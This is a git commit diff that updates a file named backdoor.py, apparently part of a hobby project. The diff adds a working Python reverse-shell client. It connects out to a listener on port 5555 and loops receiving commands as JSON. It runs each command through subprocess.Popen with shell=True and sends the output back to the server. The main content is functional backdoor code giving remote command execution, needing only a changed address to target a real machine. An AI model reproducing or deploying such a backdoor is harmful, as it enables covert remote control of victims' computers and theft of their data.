9aff270c7a447a4d742b4b022a0aed5b82bdc7cb
Sivadath <52615657+sivadathdev@users.noreply.github.com>
2022-06-30 15:49:07 +0530

    Update backdoor.py
    recieves command from server, executes the command & sends the result back to the server.

--- backdoor.py
+++ backdoor.py
@@ -1,8 +1,32 @@
 import socket
+import json
+import subprocess
+
+def send_data(data):
+	jsondata = json.dumps(data)
+	s.send(jsondata.encode())
+
+
+def recv_data():
+	data = ''
+	while True: # Infinite loop so that we can recv more than 1024 bytes in a go.
+		try:
+			data = data + s.recv(1024).decode().rstrip()
+			return json.loads(data) # deserializing the serialized data
+		except ValueError:
+			continue
+
+def shell():
+	while True:
+		command = recv_data()
+		if command == "quit":
+			break
+		execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		result = execute.stdout.read() + execute.stderr.read()
+		result = result.decode()
+		send_data(result)
 
 if __name__ == "__main__":
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(("127.0.0.1", 5555))
-
-	message = "Hello world"
-	s.send(message.encode())
+	shell()
